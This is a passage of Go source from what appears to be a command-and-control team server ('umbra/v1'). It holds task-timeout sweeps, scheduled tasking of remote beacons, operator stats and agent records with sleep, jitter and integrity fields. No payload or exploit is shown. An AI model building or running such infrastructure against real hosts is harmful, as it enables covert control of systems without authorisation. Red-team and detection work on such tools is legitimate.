		defer ticker.Stop()
		// The sweep runs on its own, slower clock: a task that timed out
		// does not become interesting again in the next second.
		sweep := time.NewTicker(30 * time.Second)
		defer sweep.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case now := <-ticker.C:
				h.fireDueSchedules(now.UTC())
			case <-sweep.C:
				h.SweepTasks(h.cfg.TaskTimeout())
			}
		}
	}()
}

// SweepTasks fails the tasks that were delivered but never completed.
//
// A beacon that dies in the middle of a task leaves it in the "delivered"
// state forever.  After the timeout the task is failed and the operator sees
// a `task.timeout` event, instead of a task that never ends.  The task is
// not run again: a task that may have run must not run twice.
func (h *Hub) SweepTasks(timeout time.Duration) int {
	if timeout <= 0 {
		return 0
	}
	stale := h.store.StaleTasks(timeout)
	for _, t := range stale {
		if !h.store.FailTask(t.ID, "the agent never answered") {
			continue
		}
		h.Emit(Event{Kind: "task.timeout", AgentID: t.AgentID, TaskID: t.ID,
			Data: map[string]any{
				"kind":   t.Kind,
				"waited": int64(timeout.Seconds()),
			}})
	}
	if len(stale) > 0 {
		h.store.SaveAsync()
	}
	return len(stale)
}

func (h *Hub) fireDueSchedules(now time.Time) {
	for _, sc := range h.store.DueSchedules(now) {
		if _, ok := h.store.Agent(sc.AgentID); !ok {
			// The agent is gone (or never checked in). Keep the schedule, skip
			// the run, and say so once per firing rather than silently.
			h.Emit(Event{Kind: "schedule.skipped", AgentID: sc.AgentID, Data: map[string]any{
				"schedule_id": sc.ID, "reason": "unknown agent",
			}})
			continue
		}
		t, err := h.SubmitTask(sc.AgentID, sc.Kind, sc.Args)
		if err != nil {
			h.Emit(Event{Kind: "schedule.skipped", AgentID: sc.AgentID, Data: map[string]any{
				"schedule_id": sc.ID, "reason": err.Error(),
			}})
			continue
		}
		h.store.MarkScheduleRan(sc.ID, t.ID)
		h.store.SaveAsync()
		h.Emit(Event{Kind: "schedule.fired", AgentID: sc.AgentID, TaskID: t.ID,
			Data: map[string]any{"schedule_id": sc.ID, "kind": sc.Kind}})
	}
}

// Stats returns a server-wide snapshot for the operator CLI.
func (h *Hub) Stats() map[string]any {
	h.mu.Lock()
	live, subs, dropped := len(h.live), len(h.subs), h.dropped
	h.mu.Unlock()
	out := h.store.Stats()
	out["agents_live"] = live
	out["operators"] = subs
	out["events_dropped"] = dropped
	out["schedules"] = len(h.store.Schedules())
	out["uptime_s"] = int(time.Since(h.started).Seconds())
	out["protocol"] = "umbra/v1"
	out["suites"] = []string{"aes-256-gcm"}
	return out
}

func agentData(a *store.Agent) map[string]any {
	return map[string]any{
		"id":         a.ID,
		"host":       a.Host,
		"os":         a.OS,
		"arch":       a.Arch,
		"user":       a.User,
		"pid":        a.PID,
		"version":    a.Version,
		"integrity":  a.Integrity,
		"transport":  a.Transport,
		"addr":       a.Addr,
		"sleep":      a.Sleep,
		"jitter":     a.Jitter,
		"state":      a.State,
		"checkins":   a.Checkins,
		"tags":       a.Tags,
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"last_seen":  a.LastSeen.Format(time.RFC3339),
	}
}
